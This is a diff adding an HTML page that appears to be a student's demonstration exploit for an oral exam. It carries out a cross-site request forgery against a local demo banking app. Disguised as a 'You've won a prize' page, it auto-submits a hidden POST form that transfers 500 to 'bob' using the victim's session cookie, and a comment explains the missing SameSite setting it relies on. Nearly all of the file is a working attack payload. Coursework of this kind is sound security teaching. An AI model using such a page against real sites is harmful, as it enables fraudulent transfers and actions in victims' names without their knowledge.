@@ -1,0 +1,27 @@
+<!--
+  ATTACKER PAGE — this is the "working exploit" artifact for the viva.
+  Host it on a DIFFERENT origin (e.g. a second local server on port 8000,
+  or just open the file directly as file://) while the victim is logged
+  into the bank app on port 5000 in the same browser.
+
+  As soon as the victim's browser loads this page, the form below
+  auto-submits a POST to /transfer. The browser attaches the victim's
+  bank session cookie automatically (because SameSite isn't set), so
+  the bank server has no way to tell this apart from a genuine request.
+-->
+<!DOCTYPE html>
+<html>
+<head><title>Congratulations! You've won a prize</title></head>
+<body>
+  <h1>Loading your prize, please wait...</h1>
+
+  <form id="csrf-form" action="http://127.0.0.1:5000/transfer" method="POST">
+    <input type="hidden" name="to" value="bob">
+    <input type="hidden" name="amount" value="500">
+  </form>
+
+  <script>
+    document.getElementById("csrf-form").submit();
+  </script>
+</body>
+</html>
